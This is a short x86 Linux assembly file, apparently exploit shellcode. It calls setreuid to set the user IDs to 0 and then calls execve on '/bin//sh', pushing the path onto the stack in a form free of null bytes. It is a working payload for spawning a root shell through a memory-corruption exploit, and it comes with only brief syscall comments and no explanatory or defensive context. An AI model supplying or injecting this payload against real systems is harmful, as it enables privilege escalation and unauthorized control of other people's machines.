[SECTION .text]

global _start

_start:

	xor eax, eax
	mov al, 70		;setreuid syscall
	xor ebx, ebx
	xor ecx, ecx

	int 0x80		;syscall

	xor eax, eax

	push eax			;\0
	push 0x68732f2f		;hs//
	push 0x6e69622f		;nib/

	mov ebx, esp		;string address (stack pointer) in ebx
	mov ecx, eax		;empty argv
	mov al, 11			;execve call
	int 0x80
